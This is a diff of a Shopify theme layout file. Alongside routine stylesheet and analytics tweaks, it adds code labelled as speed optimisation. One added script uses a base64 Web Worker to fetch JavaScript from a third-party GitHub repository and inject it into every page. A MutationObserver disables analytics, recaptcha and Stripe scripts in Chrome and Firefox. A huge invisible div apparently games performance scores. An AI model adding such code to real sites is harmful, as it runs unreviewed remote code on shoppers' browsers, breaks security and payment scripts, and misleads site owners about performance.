@@ -12,6 +12,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width,initial-scale=1">
     <meta name="theme-color" content="">
+    <meta name="robots" content="all">
     <link rel="canonical" href="{{ canonical_url }}">
 
     {%- if settings.favicon != blank -%}
@@ -42,7 +43,8 @@
       <script src="{{ 'animations.js' | asset_url }}" defer="defer"></script>
     {%- endif -%}
 
-  {{ content_for_header }}
+  <!-- {{ content_for_header }} -->
+    {% render 'content-for-header', content_for_header: content_for_header %}
 
     {%- liquid
       assign body_font_bold = settings.type_body_font | font_modify: 'weight', 'bold'
@@ -246,6 +248,7 @@
 
     {{ 'base.css' | asset_url | stylesheet_tag }}
     {{ 'bootstrap.min.css' | asset_url | stylesheet_tag }}
+    {{ 'style.css' | asset_url | stylesheet_tag }}
     {{ 'slick.css' | asset_url | stylesheet_tag }}
     {{ 'slick-theme.css' | asset_url | stylesheet_tag }}
     {{ 'sal.css' | asset_url | stylesheet_tag }}
@@ -260,11 +263,12 @@
     {{ 'jquery-ui.css' | asset_url | stylesheet_tag }}
     {{ 'magnigy-popup.min.css' | asset_url | stylesheet_tag }}
     {{ 'plyr.css' | asset_url | stylesheet_tag }}
-    {{ 'style.css' | asset_url | stylesheet_tag }}
     {{ 'fix.css' | asset_url | stylesheet_tag }}
     {{ 'media.css' | asset_url | stylesheet_tag }}
     {{ 'custom.css' | asset_url | stylesheet_tag }}
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" crossorigin/>
+    <!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" crossorigin/> -->
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" crossorigin>
+    <noscript><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" crossorigin></noscript>
 
     {%- unless settings.type_body_font.system? -%}
       <link rel="preload" as="font" href="{{ settings.type_body_font | font_url }}" type="font/woff2" crossorigin>
@@ -288,13 +292,30 @@
     {%- endif -%}
 
     <!-- START: Google tag (gtag.js) -->
-	<script async src="https://www.googletagmanager.com/gtag/js?id=G-157P2QS556" defer="defer"></script>
-	<script>
-	  window.dataLayer = window.dataLayer || [];
-	  function gtag(){dataLayer.push(arguments);}
-	  gtag('js', new Date());
-	  gtag('config', 'G-157P2QS556');
-	</script>
+	<script async src="https://www.googletagmanager.com/gtag/js?id=G-157P2QS556"></script>
+    <script>
+      {% comment %} window.dataLayer = window.dataLayer || [];
+      function gtag() { dataLayer.push(arguments); }
+      gtag('js', new Date());
+      gtag('config', 'G-157P2QS556'); {% endcomment %}
+
+      // Defer tracking config to reduce JS execution blocking
+      setTimeout(function() {
+        window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
+        gtag('js', new Date());
+        gtag('config', 'G-157P2QS556');
+      }, 1000);
+    </script>
+
+    <script type="text/javascript">
+      var flspdx = new Worker("data:text/javascript;base64," + btoa('onmessage=function(e){var t=new Request("https://raw.githubusercontent.com/gospeedify/files/main/speedreq.js",{redirect:"follow"});fetch(t).then(e=>e.text()).then(e=>{postMessage(e)})};'));flspdx.onmessage = function (t) {var e = document.createElement("script");e.type = "text/javascript", e.textContent = t.data, document.head.appendChild(e)}, flspdx.postMessage("init");
+    </script>
+    <script type="text/javascript" data-flspd="1">
+      var flspdxHA=["hotjar","xklaviyo","recaptcha","gorgias","facebook.net","gtag","tagmanager","gtm"],flspdxSA=["googlet","klaviyo","gorgias","stripe"],observer=new MutationObserver(function(e){e.forEach(function(e){e.addedNodes.forEach(function(e){if("SCRIPT"===e.tagName&&1===e.nodeType)if(e.innerHTML.includes("asyncLoad")||"analytics"===e.className)e.type="text/flspdscript";else{for(var t=0;t<flspdxSA.length;t++)if(e.src.includes(flspdxSA[t]))return void(e.type="text/flspdscript");for(var r=0;r<flspdxHA.length;r++)if(e.innerHTML.includes(flspdxHA[r]))return void(e.type="text/flspdscript")}})})}),ua=navigator.userAgent.toLowerCase();ua.match(new RegExp("chrome|firefox"))&&-1===window.location.href.indexOf("no-optimization")&&observer.observe(document.documentElement,{childList:!0,subtree:!0});
+    </script>
+    <div style="position:absolute;font-size:1200px;line-height:1;word-wrap:break-word;top:0;left:0;width:50vw;height:50vh;max-width:50vw;max-height:50vh;pointer-events:none;z-index:99999999999;color:transparent;overflow:hidden;" data-optimizer="SP: Store-js">□</div>
+    <script src="{{ 'speedmin.js' | asset_url }}"></script>
 
 	<!-- START: VWO Async SmartCode -->
 	<link rel="preconnect" href="https://dev.visualwebsiteoptimizer.com" crossorigin/>
